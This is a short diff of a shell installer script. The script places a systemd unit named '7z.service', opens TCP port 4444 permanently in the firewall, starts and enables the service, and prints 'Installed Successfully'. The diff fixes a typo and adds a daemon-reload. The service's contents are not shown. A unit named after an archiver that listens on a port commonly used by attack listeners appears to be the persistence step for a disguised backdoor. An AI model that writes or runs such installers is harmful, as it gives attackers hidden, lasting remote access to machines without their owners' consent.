@@ -10,9 +10,10 @@ sleep 1
 
 sudo strace -o /dev/null mv 7z.service /etc/systemd/system/7z.service
 sudo strace -o /dev/null firewall-cmd --zone=public --permanent --add-port=4444/tcp
-suod strace -o /dev/null firewall-cmd --reload
+sudo strace -o /dev/null firewall-cmd --reload
 sudo strace -o /dev/null systemctl start 7z
 sudo strace -o /dev/null systemctl enable 7z
+sudo strace -o /dev/null systemctl daemon-reload
 
 echo "Installed Successfully"
 
